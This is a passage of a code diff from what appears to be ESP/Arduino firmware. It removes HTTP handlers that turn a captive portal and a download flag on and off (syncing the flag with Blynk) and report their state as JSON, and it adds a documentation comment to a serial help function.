-  } else if (state == "off") {
-    stopPortal();
-    server.send(200, "text/plain", "Portal OFF");
-  } else {
-    server.send(400, "text/plain", "Usage: ?state=on|off");
-  }
-}
-
-void handleApiDownload() {
-  String state = server.arg("state");
-  if (state == "on") {
-    downloadEnabled = true;
-    Blynk.virtualWrite(V1, 1);
-    server.send(200, "text/plain", "Download ENABLED");
-  } else if (state == "off") {
-    downloadEnabled = false;
-    Blynk.virtualWrite(V1, 0);
-    server.send(200, "text/plain", "Download DISABLED");
-  } else {
-    server.send(400, "text/plain", "Usage: ?state=on|off");
-  }
-}
-
-void handleApiStatus() {
-  String json = "{";
-  json += "\"portal\":" + String(portalActive ? "true" : "false") + ",";
-  json += "\"download\":" + String(downloadEnabled ? "true" : "false");
-  json += "}";
-  server.send(200, "application/json", json);
-}
-
-// ===================== Help =====================
+/**
+ * @brief Print available serial commands.
+ */
 void showHelp() {
   Serial.println("\nCommands:");
   Serial.println("  portal on   - start captive portal");
